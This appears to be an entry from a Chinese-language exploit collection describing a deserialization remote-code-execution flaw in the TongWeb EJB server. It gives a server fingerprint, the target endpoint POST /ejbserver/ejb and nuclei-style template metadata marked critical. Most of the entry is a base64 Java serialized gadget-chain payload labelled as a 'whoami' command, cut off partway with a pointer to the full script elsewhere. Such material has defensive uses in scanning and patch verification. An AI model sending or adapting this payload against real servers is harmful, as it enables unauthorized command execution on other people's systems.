# 东方通TongWebEJB反序列化漏洞

- **系统**：东方通TongWebEJB　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`header="TongWeb Server"`
- **请求**：`POST /ejbserver/ejb HTTP/1.1`
- **关键头**：`id: tongweb-ejb-rce-multi`　`name: TongWeb EJB RCE - Multiple Commands`　`author: sect`　`severity: critical`　`description: TongWeb EJB反序列化漏洞 - 多命令检测`　`tags: tongweb,rce,deserialization`

**请求体 / payload**
```
# whoami payload
cmd_whoami: "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y/////////////////////wIAAkwACmRlY29yYXRlZHEAfgABTAALdHJhbnNmb3JtZXJ0ADFMB3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5Db21wYXJhYmxlQ29tcGFyYXRvr/////////////////////8CAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVH…（脚本共 4394 字，完整版见原文）
```